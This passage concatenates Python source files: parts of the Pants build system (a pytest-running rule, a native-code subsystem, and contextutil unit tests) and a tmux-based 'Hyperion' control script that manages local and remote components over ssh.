  for maybe_source_target in all_targets:
    if hasattr(maybe_source_target, 'sources'):
      tgt_snapshot = maybe_source_target.sources.snapshot
      tgt_source_root = source_roots.find_by_path(maybe_source_target.address.spec_path)
      sources_snapshots_and_source_roots.append((tgt_snapshot, tgt_source_root))
  all_sources_digests = yield [
    Get(
      Digest,
      DirectoryWithPrefixToStrip(
        directory_digest=snapshot.directory_digest,
        prefix=source_root.path
      )
    )
    for snapshot, source_root
    in sources_snapshots_and_source_roots
  ]

  sources_digest = yield Get(
    Digest, DirectoriesToMerge(directories=tuple(all_sources_digests)),
  )

  inits_digest = yield Get(InjectedInitDigest, Digest, sources_digest)

  all_input_digests = [
    sources_digest,
    inits_digest.directory_digest,
    requirements_pex_response.output_directory_digest,
  ]
  merged_input_files = yield Get(
    Digest,
    DirectoriesToMerge,
    DirectoriesToMerge(directories=tuple(all_input_digests)),
  )

  request = ExecuteProcessRequest(
    argv=(python_binary, './{}'.format(output_pytest_requirements_pex_filename)),
    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},                    
    input_files=merged_input_files,
    description='Run pytest for {}'.format(test_target.address.reference()),
  )

  result = yield Get(FallibleExecuteProcessResult, ExecuteProcessRequest, request)
  status = Status.SUCCESS if result.exit_code == 0 else Status.FAILURE

  yield TestResult(
    status=status,
    stdout=result.stdout.decode('utf-8'),
    stderr=result.stderr.decode('utf-8'),
  )


def rules():
  return [
      run_python_test,
      UnionRule(TestTarget, PythonTestsAdaptor),
      optionable_rule(PyTest),
      optionable_rule(PythonSetup),
      optionable_rule(SourceRootConfig),
    ]

# coding=utf-8
# Copyright 2017 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import logging
from textwrap import dedent

from pants.backend.native.subsystems.native_toolchain import NativeToolchain
from pants.backend.native.targets.native_library import NativeLibrary
from pants.backend.python.python_requirement import PythonRequirement
from pants.backend.python.subsystems import pex_build_util
from pants.backend.python.subsystems.python_setup import PythonSetup
from pants.backend.python.targets.python_distribution import PythonDistribution
from pants.base.exceptions import IncompatiblePlatformsError
from pants.binaries.executable_pex_tool import ExecutablePexTool
from pants.subsystem.subsystem import Subsystem
from pants.util.memo import memoized_property
from pants.util.objects import SubclassesOf                    


logger = logging.getLogger(__name__)


class PythonNativeCode(Subsystem):
  """A subsystem which exposes components of the native backend to the python backend."""

  options_scope = 'python-native-code'

  default_native_source_extensions = ['.c', '.cpp', '.cc']

  class PythonNativeCodeError(Exception): pass

  @classmethod
  def register_options(cls, register):
    super(PythonNativeCode, cls).register_options(register)

    register('--native-source-extensions', type=list, default=cls.default_native_source_extensions,
             fingerprint=True, advanced=True,
             help='The extensions recognized for native source files in `python_dist()` sources.')

  @classmethod
  def subsystem_dependencies(cls):
    return super(PythonNativeCode, cls).subsystem_dependencies() + (
      NativeToolchain.scoped(cls),
      PythonSetup,
    )

  @memoized_property
  def _native_source_extensions(self):
    return self.get_options().native_source_extensions

  @memoized_property
  def native_toolchain(self):
    return NativeToolchain.scoped_instance(self)

  @memoized_property
  def _python_setup(self):
    return PythonSetup.global_instance()

  def pydist_has_native_sources(self, target):
    return target.has_sources(extension=tuple(self._native_source_extensions))

  @memoized_property
  def _native_target_matchers(self):
    return {
      SubclassesOf(PythonDistribution): self.pydist_has_native_sources,
      SubclassesOf(NativeLibrary): NativeLibrary.produces_ctypes_native_library,
    }

  def _any_targets_have_native_sources(self, targets):
    # TODO(#5949): convert this to checking if the closure of python requirements has any
    # platform-specific packages (maybe find the platforms there too?).
    for tgt in targets:
      for type_constraint, target_predicate in self._native_target_matchers.items():
        if type_constraint.satisfied_by(tgt) and target_predicate(tgt):
          return True
    return False

  def check_build_for_current_platform_only(self, targets):
    """
    Performs a check of whether the current target closure has native sources and if so, ensures
    that Pants is only targeting the current platform.

    :param tgts: a list of :class:`Target` objects.
    :return: a boolean value indicating whether the current target closure has native sources.
    :raises: :class:`pants.base.exceptions.IncompatiblePlatformsError`
    """
    # TODO(#5949): convert this to checking if the closure of python requirements has any
    # platform-specific packages (maybe find the platforms there too?).
    if not self._any_targets_have_native_sources(targets):
      return False

    platforms_with_sources = pex_build_util.targets_by_platform(targets, self._python_setup)
    platform_names = list(platforms_with_sources.keys())

    if not platform_names or platform_names == ['current']:
      return True

    bad_targets = set()
    for platform, targets in platforms_with_sources.items():
      if platform == 'current':
        continue
      bad_targets.update(targets)

    raise IncompatiblePlatformsError(dedent("""\
      Pants doesn't currently support cross-compiling native code.
      The following targets set platforms arguments other than ['current'], which is unsupported for this reason.
      Please either remove the platforms argument from these targets, or set them to exactly ['current'].
      Bad targets:
      {}
      """.format('\n'.join(sorted(target.address.reference() for target in bad_targets)))
    ))


class BuildSetupRequiresPex(ExecutablePexTool):
  options_scope = 'build-setup-requires-pex'

  @classmethod
  def register_options(cls, register):
    super(BuildSetupRequiresPex, cls).register_options(register)
    register('--setuptools-version', advanced=True, fingerprint=True, default='40.6.3',
             help='The setuptools version to use when executing `setup.py` scripts.')
    register('--wheel-version', advanced=True, fingerprint=True, default='0.32.3',
             help='The wheel version to use when executing `setup.py` scripts.')

  @property
  def base_requirements(self):
    return [
      PythonRequirement('setuptools=={}'.format(self.get_options().setuptools_version)),
      PythonRequirement('wheel=={}'.format(self.get_options().wheel_version)),
    ]

# coding=utf-8
# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import os
import pstats
import shutil
import signal
import sys
import unittest
import uuid
import zipfile
from builtins import next, object, range, str
from contextlib import contextmanager

import mock
from future.utils import PY3

from pants.util.contextutil import (InvalidZipPath, Timer, environment_as, exception_logging,
                                    hermetic_environment_as, maybe_profiled, open_zip, pushd,
                                    signal_handler_as, stdio_as, temporary_dir, temporary_file)
from pants.util.process_handler import subprocess


PATCH_OPTS = dict(autospec=True, spec_set=True)


class ContextutilTest(unittest.TestCase):

  def test_empty_environment(self):
    with environment_as():
      pass

  def test_override_single_variable(self):
    with temporary_file(binary_mode=False) as output:
      # test that the override takes place
      with environment_as(HORK='BORK'):
        subprocess.Popen([sys.executable, '-c', 'import os; print(os.environ["HORK"])'],
                         stdout=output).wait()
        output.seek(0)
        self.assertEqual('BORK\n', output.read())

      # test that the variable is cleared
      with temporary_file(binary_mode=False) as new_output:
        subprocess.Popen([sys.executable, '-c', 'import os; print("HORK" in os.environ)'],
                         stdout=new_output).wait()
        new_output.seek(0)
        self.assertEqual('False\n', new_output.read())

  def test_environment_negation(self):
    with temporary_file(binary_mode=False) as output:
      with environment_as(HORK='BORK'):
        with environment_as(HORK=None):
          # test that the variable is cleared
          subprocess.Popen([sys.executable, '-c', 'import os; print("HORK" in os.environ)'],
                           stdout=output).wait()
          output.seek(0)
          self.assertEqual('False\n', output.read())

  def test_hermetic_environment(self):
    self.assertIn('USER', os.environ)                    
    with hermetic_environment_as(**{}):                    
      self.assertNotIn('USER', os.environ)                    

  def test_hermetic_environment_subprocesses(self):
    self.assertIn('USER', os.environ)                    
    with hermetic_environment_as(**dict(AAA='333')):                    
      output = subprocess.check_output('env', shell=True).decode('utf-8')                    
      self.assertNotIn('USER=', output)                    
      self.assertIn('AAA', os.environ)                    
      self.assertEqual(os.environ['AAA'], '333')                    
    self.assertIn('USER', os.environ)                    
    self.assertNotIn('AAA', os.environ)                    

  def test_hermetic_environment_unicode(self):
    UNICODE_CHAR = ''
    ENCODED_CHAR = UNICODE_CHAR.encode('utf-8')
    expected_output = UNICODE_CHAR if PY3 else ENCODED_CHAR
    with environment_as(**dict(XXX=UNICODE_CHAR)):                    
      self.assertEqual(os.environ['XXX'], expected_output)
      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):                    
        self.assertIn('AAA', os.environ)                    
        self.assertEqual(os.environ['AAA'], expected_output)
      self.assertEqual(os.environ['XXX'], expected_output)

  def test_simple_pushd(self):
    pre_cwd = os.getcwd()
    with temporary_dir() as tempdir:
      with pushd(tempdir) as path:
        self.assertEqual(tempdir, path)
        self.assertEqual(os.path.realpath(tempdir), os.getcwd())
      self.assertEqual(pre_cwd, os.getcwd())
    self.assertEqual(pre_cwd, os.getcwd())

  def test_nested_pushd(self):
    pre_cwd = os.getcwd()
    with temporary_dir() as tempdir1:
      with pushd(tempdir1):
        self.assertEqual(os.path.realpath(tempdir1), os.getcwd())
        with temporary_dir(root_dir=tempdir1) as tempdir2:
          with pushd(tempdir2):
            self.assertEqual(os.path.realpath(tempdir2), os.getcwd())
          self.assertEqual(os.path.realpath(tempdir1), os.getcwd())
        self.assertEqual(os.path.realpath(tempdir1), os.getcwd())
      self.assertEqual(pre_cwd, os.getcwd())
    self.assertEqual(pre_cwd, os.getcwd())

  def test_temporary_file_no_args(self):
    with temporary_file() as fp:
      self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.')
    self.assertTrue(os.path.exists(fp.name) == False,
                    'Temporary file should not exist outside of the context.')

  def test_temporary_file_without_cleanup(self):
    with temporary_file(cleanup=False) as fp:
      self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.')
    self.assertTrue(os.path.exists(fp.name),
                    'Temporary file should exist outside of context if cleanup=False.')
    os.unlink(fp.name)

  def test_temporary_file_within_other_dir(self):
    with temporary_dir() as path:
      with temporary_file(root_dir=path) as f:
        self.assertTrue(os.path.realpath(f.name).startswith(os.path.realpath(path)),
                        'file should be created in root_dir if specified.')

  def test_temporary_dir_no_args(self):
    with temporary_dir() as path:
      self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.')
      self.assertTrue(os.path.isdir(path), 'Temporary dir should be a dir and not a file.')
    self.assertFalse(os.path.exists(path), 'Temporary dir should not exist outside of the context.')

  def test_temporary_dir_without_cleanup(self):
    with temporary_dir(cleanup=False) as path:
      self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.')
    self.assertTrue(os.path.exists(path),
                    'Temporary dir should exist outside of context if cleanup=False.')
    shutil.rmtree(path)

  def test_temporary_dir_with_root_dir(self):
    with temporary_dir() as path1:
      with temporary_dir(root_dir=path1) as path2:
        self.assertTrue(os.path.realpath(path2).startswith(os.path.realpath(path1)),
                        'Nested temporary dir should be created within outer dir.')

  def test_timer(self):

    class FakeClock(object):

      def __init__(self):
        self._time = 0.0

      def time(self):
        ret = self._time
        self._time += 0.0001  # Force a little time to elapse.
        return ret

      def sleep(self, duration):
        self._time += duration

    clock = FakeClock()

    # Note: to test with the real system clock, use this instead:
    # import time
    # clock = time

    with Timer(clock=clock) as t:
      self.assertLess(t.start, clock.time())
      self.assertGreater(t.elapsed, 0)
      clock.sleep(0.1)
      self.assertGreater(t.elapsed, 0.1)
      clock.sleep(0.1)
      self.assertTrue(t.finish is None)
    self.assertGreater(t.elapsed, 0.2)
    self.assertLess(t.finish, clock.time())

  def test_open_zipDefault(self):
    with temporary_dir() as tempdir:
      with open_zip(os.path.join(tempdir, 'test'), 'w') as zf:
        self.assertTrue(zf._allowZip64)

  def test_open_zipTrue(self):
    with temporary_dir() as tempdir:
      with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=True) as zf:
        self.assertTrue(zf._allowZip64)

  def test_open_zipFalse(self):
    with temporary_dir() as tempdir:
      with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=False) as zf:
        self.assertFalse(zf._allowZip64)

  def test_open_zip_raises_exception_on_falsey_paths(self):
    falsey = (None, '', False)
    for invalid in falsey:
      with self.assertRaises(InvalidZipPath):
        next(open_zip(invalid).gen)

  def test_open_zip_returns_realpath_on_badzipfile(self):
    # In case of file corruption, deleting a Pants-constructed symlink would not resolve the error.
    with temporary_file() as not_zip:
      with temporary_dir() as tempdir:
        file_symlink = os.path.join(tempdir, 'foo')
        os.symlink(not_zip.name, file_symlink)
        self.assertEqual(os.path.realpath(file_symlink), os.path.realpath(not_zip.name))
        with self.assertRaisesRegexp(zipfile.BadZipfile, r'{}'.format(not_zip.name)):
          next(open_zip(file_symlink).gen)

  @contextmanager
  def _stdio_as_tempfiles(self):
    """Harness to replace `sys.std*` with tempfiles.

    Validates that all files are read/written/flushed correctly, and acts as a
    contextmanager to allow for recursive tests.
    """

    # Prefix contents written within this instance with a unique string to differentiate
    # them from other instances.
    uuid_str = str(uuid.uuid4())
    def u(string):
      return '{}#{}'.format(uuid_str, string)
    stdin_data = u('stdio')
    stdout_data = u('stdout')
    stderr_data = u('stderr')

    with temporary_file(binary_mode=False) as tmp_stdin,\
         temporary_file(binary_mode=False) as tmp_stdout,\
         temporary_file(binary_mode=False) as tmp_stderr:
      print(stdin_data, file=tmp_stdin)
      tmp_stdin.seek(0)
      # Read prepared content from stdin, and write content to stdout/stderr.
      with stdio_as(stdout_fd=tmp_stdout.fileno(),
                    stderr_fd=tmp_stderr.fileno(),
                    stdin_fd=tmp_stdin.fileno()):
        self.assertEqual(sys.stdin.fileno(), 0)
        self.assertEqual(sys.stdout.fileno(), 1)
        self.assertEqual(sys.stderr.fileno(), 2)

        self.assertEqual(stdin_data, sys.stdin.read().strip())
        print(stdout_data, file=sys.stdout)
        yield
        print(stderr_data, file=sys.stderr)

      tmp_stdout.seek(0)
      tmp_stderr.seek(0)
      self.assertEqual(stdout_data, tmp_stdout.read().strip())
      self.assertEqual(stderr_data, tmp_stderr.read().strip())

  def test_stdio_as(self):
    self.assertTrue(sys.stderr.fileno() > 2,
                    "Expected a pseudofile as stderr, got: {}".format(sys.stderr))
    old_stdout, old_stderr, old_stdin = sys.stdout, sys.stderr, sys.stdin

    # The first level tests that when `sys.std*` are file-likes (in particular, the ones set up in
    # pytest's harness) rather than actual files, we stash and restore them properly.
    with self._stdio_as_tempfiles():
      # The second level stashes the first level's actual file objects and then re-opens them.
      with self._stdio_as_tempfiles():
        pass

      # Validate that after the second level completes, the first level still sees valid
      # fds on `sys.std*`.
      self.assertEqual(sys.stdin.fileno(), 0)
      self.assertEqual(sys.stdout.fileno(), 1)
      self.assertEqual(sys.stderr.fileno(), 2)

    self.assertEqual(sys.stdout, old_stdout)
    self.assertEqual(sys.stderr, old_stderr)
    self.assertEqual(sys.stdin, old_stdin)

  def test_stdio_as_dev_null(self):
    # Capture output to tempfiles.
    with self._stdio_as_tempfiles():
      # Read/write from/to `/dev/null`, which will be validated by the harness as not
      # affecting the tempfiles.
      with stdio_as(stdout_fd=-1, stderr_fd=-1, stdin_fd=-1):
        self.assertEqual('', sys.stdin.read())
        print('garbage', file=sys.stdout)
        print('garbage', file=sys.stderr)

  def test_signal_handler_as(self):
    mock_initial_handler = 1
    mock_new_handler = 2
    with mock.patch('signal.signal', **PATCH_OPTS) as mock_signal:
      mock_signal.return_value = mock_initial_handler
      try:
        with signal_handler_as(signal.SIGUSR2, mock_new_handler):
          raise NotImplementedError('blah')
      except NotImplementedError:
        pass
    self.assertEqual(mock_signal.call_count, 2)
    mock_signal.assert_has_calls([
      mock.call(signal.SIGUSR2, mock_new_handler),
      mock.call(signal.SIGUSR2, mock_initial_handler)
    ])

  def test_permissions(self):
    with temporary_file(permissions=0o700) as f:
      self.assertEqual(0o700, os.stat(f.name)[0] & 0o777)

    with temporary_dir(permissions=0o644) as path:
      self.assertEqual(0o644, os.stat(path)[0] & 0o777)

  def test_exception_logging(self):
    fake_logger = mock.Mock()

    with self.assertRaises(AssertionError):
      with exception_logging(fake_logger, 'error!'):
        assert True is False

    fake_logger.exception.assert_called_once_with('error!')

  def test_maybe_profiled(self):
    with temporary_dir() as td:
      profile_path = os.path.join(td, 'profile.prof')

      with maybe_profiled(profile_path):
        for _ in range(5):
          print('test')

      # Ensure the profile data was written.
      self.assertTrue(os.path.exists(profile_path))

      # Ensure the profile data is valid.
      pstats.Stats(profile_path).print_stats()

#! /usr/bin/env python
from libtmux import Server
from yaml import load, dump
from setupParser import Loader
from DepTree import Node, dep_resolve, CircularReferenceException
import logging
import os
import socket
import argparse
from psutil import Process
from subprocess import call
from graphviz import Digraph
from enum import Enum
from time import sleep

import sys
from PyQt4 import QtGui
import hyperGUI

FORMAT = "%(asctime)s: %(name)s [%(levelname)s]:\t%(message)s"

logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')
TMP_SLAVE_DIR = "/tmp/Hyperion/slave/components"
TMP_COMP_DIR = "/tmp/Hyperion/components"
TMP_LOG_PATH = "/tmp/Hyperion/log"

BASE_DIR = os.path.dirname(__file__)
SCRIPT_CLONE_PATH = ("%s/scripts/start_named_clone_session.sh" % BASE_DIR)


class CheckState(Enum):
    RUNNING = 0
    STOPPED = 1
    STOPPED_BUT_SUCCESSFUL = 2
    STARTED_BY_HAND = 3
    DEP_FAILED = 4


class ControlCenter:

    def __init__(self, configfile=None):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.configfile = configfile
        self.nodes = {}
        self.server = []
        self.host_list = []

        if configfile:
            self.load_config(configfile)
            self.session_name = self.config["name"]

            # Debug write resulting yaml file
            with open('debug-result.yml', 'w') as outfile:
                dump(self.config, outfile, default_flow_style=False)
            self.logger.debug("Loading config was successful")

            self.server = Server()

            if self.server.has_session(self.session_name):
                self.session = self.server.find_where({
                    "session_name": self.session_name
                })

                self.logger.info('found running session by name "%s" on server' % self.session_name)
            else:
                self.logger.info('starting new session by name "%s" on server' % self.session_name)
                self.session = self.server.new_session(
                    session_name=self.session_name,
                    window_name="Main"
                )
        else:
            self.config = None

    ###################
    # Setup
    ###################
    def load_config(self, filename="default.yaml"):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")

        else:
            for group in self.config['groups']:
                for comp in group['components']:
                    self.logger.debug("Checking component '%s' in group '%s' on host '%s'" %
                                      (comp['name'], group['name'], comp['host']))

                    if comp['host'] != "localhost" and not self.run_on_localhost(comp):
                        self.copy_component_to_remote(comp, comp['name'], comp['host'])

            # Remove duplicate hosts
            self.host_list = list(set(self.host_list))

            self.set_dependencies(True)

    def set_dependencies(self, exit_on_fail):
        for group in self.config['groups']:
            for comp in group['components']:
                self.nodes[comp['name']] = Node(comp)

        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all
        # nodes with simple algorithms
        master_node = Node({'name': 'master_node'})
        for name in self.nodes:
            node = self.nodes.get(name)

            # Add edges from each node to pseudo node
            master_node.addEdge(node)

            # Add edges based on dependencies specified in the configuration
            if "depends" in node.component:
                for dep in node.component['depends']:
                    if dep in self.nodes:
                        node.addEdge(self.nodes[dep])
                    else:
                        self.logger.error("Unmet dependency: '%s' for component '%s'!" % (dep, node.comp_name))
                        if exit_on_fail:
                            exit(1)
        self.nodes['master_node'] = master_node

        # Test if starting all components is possible
        try:
            node = self.nodes.get('master_node')
            res = []
            unres = []
            dep_resolve(node, res, unres)
            dep_string = ""
            for node in res:
                if node is not master_node:
                    dep_string = "%s -> %s" % (dep_string, node.comp_name)
            self.logger.debug("Dependency tree for start all: %s" % dep_string)
        except CircularReferenceException as ex:
            self.logger.error("Detected circular dependency reference between %s and %s!" % (ex.node1, ex.node2))
            if exit_on_fail:
                exit(1)

    def copy_component_to_remote(self, infile, comp, host):
        self.host_list.append(host)

        self.logger.debug("Saving component to tmp")
        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))
        ensure_dir(tmp_comp_path)
        with open(tmp_comp_path, 'w') as outfile:
            dump(infile, outfile, default_flow_style=False)

        self.logger.debug('Copying component "%s" to remote host "%s"' % (comp, host))
        cmd = ("ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml" %
               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))
        self.logger.debug(cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Stop
    ###################
    def stop_component(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug("Stopping remote component '%s' on host '%s'" % (comp['name'], comp['host']))
            self.stop_remote_component(comp['name'], comp['host'])
        else:
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug("window '%s' found running" % comp['name'])
                self.logger.info("Shutting down window...")
                kill_window(window)
                self.logger.info("... done!")

    def stop_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = ("ssh %s 'hyperion --config %s/%s.yaml slave --kill'" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug("Run cmd:\n%s" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Start
    ###################
    def start_component(self, comp):

        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        for node in res:
            self.logger.debug("node name '%s' vs. comp name '%s'" % (node.comp_name, comp['name']))
            if node.comp_name != comp['name']:
                self.logger.debug("Checking and starting %s" % node.comp_name)
                state = self.check_component(node.component)
                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or
                        state is CheckState.STARTED_BY_HAND or
                        state is CheckState.RUNNING):
                    self.logger.debug("Component %s is already running, skipping to next in line" % comp['name'])
                else:
                    self.logger.debug("Start component '%s' as dependency of '%s'" % (node.comp_name, comp['name']))
                    self.start_component_without_deps(node.component)

                    tries = 0
                    while True:
                        self.logger.debug("Checking %s resulted in checkstate %s" % (node.comp_name, state))
                        state = self.check_component(node.component)
                        if (state is not CheckState.RUNNING or
                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):
                            break
                        if tries > 100:
                            return False
                        tries = tries + 1
                        sleep(.5)

        self.logger.debug("All dependencies satisfied, starting '%s'" % (comp['name']))
        state = self.check_component(node.component)
        if (state is CheckState.STARTED_BY_HAND or
                state is CheckState.RUNNING):
            self.logger.debug("Component %s is already running. Skipping start" % comp['name'])
        else:
            self.start_component_without_deps(comp)
        return True

    def start_component_without_deps(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug("Starting remote component '%s' on host '%s'" % (comp['name'], comp['host']))
            self.start_remote_component(comp['name'], comp['host'])
        else:
            log_file = ("%s/%s" % (TMP_LOG_PATH, comp['name']))
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug("Restarting '%s' in old window" % comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])
            else:
                self.logger.info("creating window '%s'" % comp['name'])
                window = self.session.new_window(comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])

    def start_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = ("ssh %s 'hyperion --config %s/%s.yaml slave'" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug("Run cmd:\n%s" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Check
    ###################
    def check_component(self, comp):
        return check_component(comp, self.session, self.logger)                    

    ###################
    # Dependency management
    ###################
    def get_dep_list(self, comp):
        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        res.remove(node)

        return res

    ###################
    # Host related checks
    ###################
    def is_localhost(self, hostname):
        try:
            hn_out = socket.gethostbyname(hostname)
            if hn_out == '127.0.0.1' or hn_out == '::1':
                self.logger.debug("Host '%s' is localhost" % hostname)
                return True
            else:
                self.logger.debug("Host '%s' is not localhost" % hostname)
                return False
        except socket.gaierror:
            sys.exit("Host '%s' is unknown! Update your /etc/hosts file!" % hostname)

    def run_on_localhost(self, comp):
        return self.is_localhost(comp['host'])

    ###################
    # TMUX
    ###################
    def kill_remote_session_by_name(self, name, host):
        cmd = "ssh -t %s 'tmux kill-session -t %s'" % (host, name)
        send_main_session_command(self.session, cmd)

    def start_clone_session(self, comp_name, session_name):
        cmd = "%s '%s' '%s'" % (SCRIPT_CLONE_PATH, session_name, comp_name)
        send_main_session_command(self.session, cmd)

    def start_remote_clone_session(self, comp_name, session_name, hostname):
        remote_cmd = ("%s '%s' '%s'" % (SCRIPT_CLONE_PATH, session_name, comp_name))
        cmd = "ssh %s 'bash -s' < %s" % (hostname, remote_cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Visualisation
    ###################
    def draw_graph(self):
        deps = Digraph("Deps", strict=True)
        deps.graph_attr.update(rankdir="BT")
        try:
            node = self.nodes.get('master_node')

            for current in node.depends_on:
                deps.node(current.comp_name)

                res = []
                unres = []
                dep_resolve(current, res, unres)
                for node in res:
                    if "depends" in node.component:
                        for dep in node.component['depends']:
                            if dep not in self.nodes:
                                deps.node(dep, color="red")
                                deps.edge(node.comp_name, dep, "missing", color="red")
                            elif node.comp_name is not "master_node":
                                deps.edge(node.comp_name, dep)

        except CircularReferenceException as ex:
            self.logger.error("Detected circular dependency reference between %s and %s!" % (ex.node1, ex.node2))
            deps.edge(ex.node1, ex.node2, "circular error", color="red")
            deps.edge(ex.node2, ex.node1, color="red")

        deps.view()


class SlaveLauncher:

    def __init__(self, configfile=None, kill_mode=False, check_mode=False):
        self.kill_mode = kill_mode
        self.check_mode = check_mode
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.config = None
        self.session = None
        if kill_mode:
            self.logger.info("started slave with kill mode")
        if check_mode:
            self.logger.info("started slave with check mode")
        self.server = Server()

        if self.server.has_session("slave-session"):
            self.session = self.server.find_where({
                "session_name": "slave-session"
            })

            self.logger.info('found running slave session on server')
        elif not kill_mode and not check_mode:
            self.logger.info('starting new slave session on server')
            self.session = self.server.new_session(
                session_name="slave-session"
            )

        else:
            self.logger.info("No slave session found on server. Aborting")
            exit(CheckState.STOPPED)

        if configfile:
            self.load_config(configfile)
            self.window_name = self.config['name']
            self.flag_path = ("/tmp/Hyperion/slaves/%s" % self.window_name)
            self.log_file = ("/tmp/Hyperion/log/%s" % self.window_name)
            ensure_dir(self.log_file)
        else:
            self.logger.error("No slave component config provided")

    def load_config(self, filename="default.yaml"):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")
        elif not self.session:
            self.logger.error(" Init aborted. No session was found!")
        else:
            self.logger.debug(self.config)
            window = find_window(self.session, self.window_name)

            if window:
                self.logger.debug("window '%s' found running" % self.window_name)
                if self.kill_mode:
                    self.logger.info("Shutting down window...")
                    kill_window(window)
                    self.logger.info("... done!")
            elif not self.kill_mode:
                self.logger.info("creating window '%s'" % self.window_name)
                window = self.session.new_window(self.window_name)
                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)

            else:
                self.logger.info("There is no component running by the name '%s'. Exiting kill mode" %
                                 self.window_name)

    def run_check(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")
            exit(CheckState.STOPPED.value)
        elif not self.session:
            self.logger.error(" Init aborted. No session was found!")
            exit(CheckState.STOPPED.value)

        check_state = check_component(self.config, self.session, self.logger)
        exit(check_state.value)

###################
# Component Management
###################
def run_component_check(comp):
    if call(comp['cmd'][1]['check'], shell=True) == 0:
        return True
    else:
        return False


def check_component(comp, session, logger):
    logger.debug("Running component check for %s" % comp['name'])
    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]
    window = find_window(session, comp['name'])
    if window:
        pid = get_window_pid(window)
        logger.debug("Found window pid: %s" % pid)

        # May return more child pids if logging is done via tee (which then was started twice in the window too)
        procs = []
        for entry in pid:
            procs.extend(Process(entry).children(recursive=True))
        pids = [p.pid for p in procs]
        logger.debug("Window is running %s child processes" % len(pids))

        # Two processes are tee logging
        # TODO: Change this when more logging options are introduced
        if len(pids) < 3:                    
            logger.debug("Main window process has finished. Running custom check if available")
            if check_available and run_component_check(comp):
                logger.debug("Process terminated but check was successful")
                return CheckState.STOPPED_BUT_SUCCESSFUL
            else:
                logger.debug("Check failed or no check available: returning false")
                return CheckState.STOPPED
        elif check_available and run_component_check(comp):
            logger.debug("Check succeeded")
            return CheckState.RUNNING
        elif not check_available:
            logger.debug("No custom check specified and got sufficient pid amount: returning true")
            return CheckState.RUNNING
        else:
            logger.debug("Check failed: returning false")
            return CheckState.STOPPED
    else:
        logger.debug("%s window is not running. Running custom check" % comp['name'])
        if check_available and run_component_check(comp):
            logger.debug("Component was not started by Hyperion, but the check succeeded")
            return CheckState.STARTED_BY_HAND
        else:
            logger.debug("Window not running and no check command is available or it failed: returning false")
            return CheckState.STOPPED


def get_window_pid(window):
    r = window.cmd('list-panes',
                   "-F #{pane_pid}")
    return [int(p) for p in r.stdout]

###################
# TMUX
###################
def kill_session_by_name(server, name):
    session = server.find_where({
        "session_name": name
    })
    session.kill_session()


def kill_window(window):
    window.cmd("send-keys", "", "C-c")
    window.kill_window()


def start_window(window, cmd, log_file, comp_name):
    setup_log(window, log_file, comp_name)
    window.cmd("send-keys", cmd, "Enter")


def find_window(session, window_name):
    window = session.find_where({
        "window_name": window_name
    })
    return window


def send_main_session_command(session, cmd):
    window = find_window(session, "Main")
    window.cmd("send-keys", cmd, "Enter")


###################
# Logging
###################
def setup_log(window, file, comp_name):
    clear_log(file)
    # Reroute stderr to log file
    window.cmd("send-keys", "exec 2> >(exec tee -i -a '%s')" % file, "Enter")
    # Reroute stdin to log file
    window.cmd("send-keys", "exec 1> >(exec tee -i -a '%s')" % file, "Enter")
    window.cmd("send-keys", ('echo "#Hyperion component start: %s\n$(date)"' % comp_name), "Enter")


def clear_log(file_path):
    if os.path.isfile(file_path):
        os.remove(file_path)


def ensure_dir(file_path):
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)

###################
# Startup
###################
def main():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser()

    # Create top level parser
    parser.add_argument("--config", '-c', type=str,
                        default='test.yaml',
                        help="YAML config file. see sample-config.yaml. Default: test.yaml")
    subparsers = parser.add_subparsers(dest="cmd")

    # Create parser for the editor command
